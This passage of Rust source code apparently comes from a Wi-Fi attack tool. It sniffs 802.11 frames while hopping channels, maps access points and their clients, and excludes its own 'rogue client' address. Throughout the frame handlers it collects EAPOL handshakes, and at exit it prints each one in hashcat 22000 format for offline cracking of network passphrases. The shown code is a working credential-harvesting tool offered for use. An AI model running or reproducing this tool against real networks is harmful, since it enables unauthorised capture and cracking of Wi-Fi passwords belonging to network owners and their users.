                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::QosDataCfAck(data_frame) => {
                    let source = data_frame.src().expect("Unable to get src");
                    let dest = data_frame.dest();
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);

                    if let Some(mut eapol) = data_frame.eapol_key.clone() {
                        self.eapol_count += 1;
                        let essid: Option<String> =
                            if let Some(ap) = self.access_points.get_device(&ap_addr) {
                                if let WiFiDeviceType::AccessPoint(ap_data) = &ap.device_type {
                                    ap_data.ssid.clone()
                                } else {
                                    None
                                }
                            } else {
                                None
                            };

                        let result = self.handshake_storage.add_or_update_handshake(
                            &ap_addr,
                            &station_addr,
                            eapol.clone(),
                            essid,
                        );
                        match result {
                            Ok(_) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "New Eapol: {source} => {dest} ({})",
                                        eapol.determine_key_type()
                                    ),
                                ));
                            }
                            Err(e) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
                                        eapol.determine_key_type(),
                                    ),
                                ));
                            }
                        }
                    }
                }
                Frame::QosDataCfPoll(data_frame) => {
                    let source = data_frame.src().expect("Unable to get src");
                    let dest = data_frame.dest();
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);

                    if let Some(mut eapol) = data_frame.eapol_key.clone() {
                        self.eapol_count += 1;
                        let essid: Option<String> =
                            if let Some(ap) = self.access_points.get_device(&ap_addr) {
                                if let WiFiDeviceType::AccessPoint(ap_data) = &ap.device_type {
                                    ap_data.ssid.clone()
                                } else {
                                    None
                                }
                            } else {
                                None
                            };

                        let result = self.handshake_storage.add_or_update_handshake(
                            &ap_addr,
                            &station_addr,
                            eapol.clone(),
                            essid,
                        );
                        match result {
                            Ok(_) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "New Eapol: {source} => {dest} ({})",
                                        eapol.determine_key_type()
                                    ),
                                ));
                            }
                            Err(e) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
                                        eapol.determine_key_type(),
                                    ),
                                ));
                            }
                        }
                    }
                }
                Frame::QosDataCfAckCfPoll(data_frame) => {
                    let source = data_frame.src().expect("Unable to get src");
                    let dest = data_frame.dest();
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);

                    if let Some(mut eapol) = data_frame.eapol_key.clone() {
                        self.eapol_count += 1;
                        let essid: Option<String> =
                            if let Some(ap) = self.access_points.get_device(&ap_addr) {
                                if let WiFiDeviceType::AccessPoint(ap_data) = &ap.device_type {
                                    ap_data.ssid.clone()
                                } else {
                                    None
                                }
                            } else {
                                None
                            };

                        let result = self.handshake_storage.add_or_update_handshake(
                            &ap_addr,
                            &station_addr,
                            eapol.clone(),
                            essid,
                        );
                        match result {
                            Ok(_) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "New Eapol: {source} => {dest} ({})",
                                        eapol.determine_key_type()
                                    ),
                                ));
                            }
                            Err(e) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
                                        eapol.determine_key_type(),
                                    ),
                                ));
                            }
                        }
                    }
                }
                Frame::QosCfPoll(data_frame) => {
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::QosCfAckCfPoll(data_frame) => {
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
            },
            Err(err) => {
                if let libwifi::error::Error::Failure(_, _) = err {
                    self.error_count += 1;
                    // Parsing errors are bound to happen. Partial data is almost a gurantee just because of interference and other rx issues. Let's iterate the counter but that's it.
                    // A high error counter is usually a sign of lots of messy data coming through the socket, but not necessarily a concern- especially in busy RF Environments.
                    /* self.status_log.add_message(StatusMessage::new(
                        MessageType::Error,
                        format!("Error during parsing data: {} bytes", data.len()),
                    )); */
                }
            }
        };

        Ok(())
    }

    pub fn read_packet(&mut self) -> Result<Vec<u8>, String> {
        let mut buffer = vec![0u8; 6000];
        let packet_len = unsafe {
            libc::read(
                self.rx_socket.as_raw_fd(),
                buffer.as_mut_ptr() as *mut libc::c_void,
                buffer.len(),
            )
        };

        // Handle non-blocking read
        if packet_len < 0 {
            let error_code = io::Error::last_os_error();
            if error_code.kind() == io::ErrorKind::WouldBlock {
                /* self.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    "No data available".to_string(),
                )); */
                return Err("No data available".to_string());
            } else {
                // An actual error occurred
                self.error_count += 1;
                self.status_log.add_message(StatusMessage::new(
                    MessageType::Error,
                    format!("Error Reading from Socket: {error_code:?}"),
                ));
                return Err(error_code.to_string());
            }
        }

        buffer.truncate(packet_len as usize);
        Ok(buffer)
    }
}

fn write_packet(fd: i32, packet: &[u8]) -> Result<(), String> {
    let bytes_written =
        unsafe { libc::write(fd, packet.as_ptr() as *const libc::c_void, packet.len()) };

    if bytes_written < 0 {
        // An error occurred during write
        let error_code = io::Error::last_os_error();

        return Err(error_code.to_string());
    }

    if bytes_written as usize != packet.len() {}

    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut oxide = WPOxideRuntime::new();
    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        "Starting...".to_string(),
    ));
    let iface = oxide.interface.clone();
    let idx = iface.index.unwrap();
    let interface_name =
        String::from_utf8(iface.name.unwrap()).expect("cannot get interface name from bytes.");

    //oxide.ntsocks.print_interface(idx);

    let duration = Duration::from_secs(1);
    thread::sleep(duration);

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    let mut last_status_time = Instant::now();
    let status_interval = Duration::from_millis(100);

    let mut last_interactions_clear = Instant::now();
    let interactions_interval = Duration::from_secs(500);

    let hop_interval = Duration::from_secs(2);
    let channels = vec![1, 6, 11];

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("Setting channel hopper: {:?}", channels),
    ));
    start_channel_hopping_thread(running.clone(), hop_interval, idx, channels);

    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    })?;

    let start_time = Instant::now();
    execute!(stdout(), Hide).unwrap();
    while running.load(Ordering::SeqCst) {
        // Start UI Messages
        if last_status_time.elapsed() >= status_interval {
            last_status_time = Instant::now();
            oxide.print_device_lists(start_time);
        }

        // Clear all interactions counters every 60 seconds.
        if last_interactions_clear.elapsed() >= interactions_interval {
            last_interactions_clear = Instant::now();
            oxide.access_points.clear_all_interactions();
        }

        // Read Packet
        if let Ok(packet) = oxide.read_packet() {
            oxide.handle_packet(&packet)?;
        }
    }
    execute!(stdout(), Show).unwrap();

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("Setting {} down.", interface_name),
    ));

    match oxide.ntsocks.set_interface_down(idx) {
        Ok(_) => {}
        Err(e) => {
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Error: {e:?}"),
            ));
        }
    }

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("Setting {} to station mode.", interface_name),
    ));
    match oxide.ntsocks.set_interface_station(idx) {
        Ok(_) => {}
        Err(e) => {
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Error: {e:?}"),
            ));
        }
    }
    println!();
    //println!("HashCat 22000:");
    for (_, handshakes) in oxide.handshake_storage.get_handshakes() {
        if !handshakes.is_empty() {
            for hs in handshakes {
                if let Some(hc) = hs.to_hashcat_22000_format() {
                    println!("================================================================");
                    println!("{:^64}", hs.essid_to_string());
                    println!("================================================================");
                    println!("{}", hc);
                    println!("================================================================");
                }
            }
        }
    }

    Ok(())
}

pub fn start_channel_hopping_thread(
    running: Arc<AtomicBool>,
    hop_interval: Duration,
    idx: i32,
    channels: Vec<u8>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut ntsocks = ntlook::SocketsBuilder::new().build().unwrap();
        let mut cycle_iter = channels.iter().cycle();
        let mut last_hop_time = Instant::now();
        if let Some(&channel) = cycle_iter.next() {
            if let Err(e) = ntsocks.set_interface_chan(idx, channel) {
                eprintln!("Error changing channel: {:?}", e);
            }
        }
        while running.load(Ordering::SeqCst) {
            if last_hop_time.elapsed() >= hop_interval {
                if let Some(&channel) = cycle_iter.next() {
                    if let Err(e) = ntsocks.set_interface_chan(idx, channel) {
                        eprintln!("Error changing channel: {:?}", e);
                    }
                    last_hop_time = Instant::now();
                }
            }

            // Sleep a little to prevent the loop from running too hot
            thread::sleep(Duration::from_millis(10));
        }
    })
}
